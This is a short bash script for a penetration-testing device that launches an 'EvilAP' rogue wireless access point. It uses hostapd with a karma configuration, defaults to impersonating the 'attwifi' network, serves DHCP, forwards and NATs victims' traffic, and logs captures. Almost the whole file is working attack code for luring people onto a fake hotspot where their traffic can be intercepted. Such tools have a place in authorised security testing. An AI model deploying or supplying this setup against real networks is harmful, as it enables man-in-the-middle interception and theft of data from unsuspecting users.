#!/bin/bash
#Evilap script with Hostapd

##################################################
f_modprobe(){
#load all modules for external adapters:
mkdir -p /dev/net/
ln -s /dev/tun /dev/net/tun
modprobe ath9k_htc
modprobe btusb
modprobe tun
}

f_modprobe


f_interface(){
  clear

  echo '    Welcome to the EvilAP (hostapd)

  Select which interface you are using for Internet? (1-3):

  1. rmnet0 (3G GSM connection)
  2. eth0  (USB ethernet adapter)
  3. wlan0  (Internal Nexus Wifi)'


  read -p "Choice: " interfacechoice

  case "$interfacechoice" in
    1) f_rmnet0 ;;
    2) f_eth0 ;;
    3) f_wlan0 ;;
    *) f_rmnet0 ;;
  esac
}

f_rmnet0(){
  interface=rmnet0
}

f_eth0(){
  interface=eth0
}

f_wlan0(){
  interface=wlan0
}

set_ssid(){
  read -p "Enter SSID [attwifi]: " ssid
  if [ -z "$ssid" ]
  then
    ssid=attwifi
  fi
}

set_up_ip_forward(){
  echo 1 > /proc/sys/net/ipv4/ip_forward
}

configure_wlan1(){
  ifconfig wlan1 up 192.168.7.1 netmask 255.255.255.0
}

configure_dhcpd(){
  dhcpd -cf /etc/dhcp/dhcpd.conf wlan1
}

set_iptables(){
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
}

start_hostapd(){
  hostapd /etc/hostapd/hostapd_karma.conf |tee /opt/pwnpad/captures/evilap/hostapd${date}.log
}

start_evilap(){
  f_interface       &&
  set_ssid          &&
  set_up_ip_forward &&
  configure_wlan1   &&
  configure_dhcpd   &&
  set_iptables      &&
  start_hostapd
}


killall -9 hostapd 2>&1 > /dev/null
killall -9 dhcpd 2>&1 > /dev/null
start_evilap
